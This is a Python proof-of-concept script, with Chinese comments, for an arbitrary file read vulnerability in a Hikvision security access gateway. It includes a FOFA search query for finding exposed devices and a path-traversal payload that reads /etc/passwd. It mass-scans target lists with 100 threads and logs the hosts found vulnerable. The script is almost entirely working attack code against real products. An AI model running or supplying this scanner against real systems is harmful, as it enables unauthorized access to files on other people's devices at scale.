#海康威视安全接入网关任意文件读取漏洞
#fofa:body="webui/js/jquerylib/jquery-1.7.2.min.js" && product="ABT-应用网关" || body="webui/js/jquerylib/jquery-1.7.2.min.js" && product="HIKVISION-安全网关"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                                                                                                                                                                               
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="海康威视安全接入网关任意文件读取漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:95.0)Gecko/20100101Firefox/95.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
        'Cookie':'USGSESSID=b75bce9897c9e543ab7be9ac44af4f76',
        'Upgrade-Insecure-Requests':'1',             
    }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if res1.status_code==200 and '/bin/sh' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()